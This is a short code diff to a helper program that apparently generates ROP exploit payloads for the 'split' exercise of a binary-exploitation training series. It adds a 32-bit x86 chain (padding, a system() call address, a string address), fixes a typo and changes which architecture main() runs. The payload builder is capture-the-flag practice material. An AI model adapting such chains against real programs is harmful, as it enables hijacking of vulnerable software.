@@ -63,7 +63,22 @@ ARCH_CALL(x86_64, split)(void)
 		rop_addr(ADDR_OTHER);
 		rop_name("usefulString address");
 		rop_addr(ADDR_CODE);
-		rop_name("sytem call");
+		rop_name("system call");
+	rop_end();
+	rop_dump();
+	rop_destroy();
+}
+
+void
+ARCH_CALL(x86, split)(void)
+{
+	rop_opt_set(RD_INIT | RD_WORD_32);
+	rop_begin();
+		rop_padding(44);
+		rop_addr(ADDR_CODE);
+		rop_name("system call");
+		rop_addr(ADDR_OTHER);
+		rop_name("usefulString address");
 	rop_end();
 	rop_dump();
 	rop_destroy();
@@ -109,8 +124,8 @@ rop_stack(void)
 int main(void)
 {
 //	armv5_ret2win();
-	x86_64_split();
-//	armv5_split();
+//	x86_split();
+	armv5_split();
 }
 
 // Stack:                       Payload:
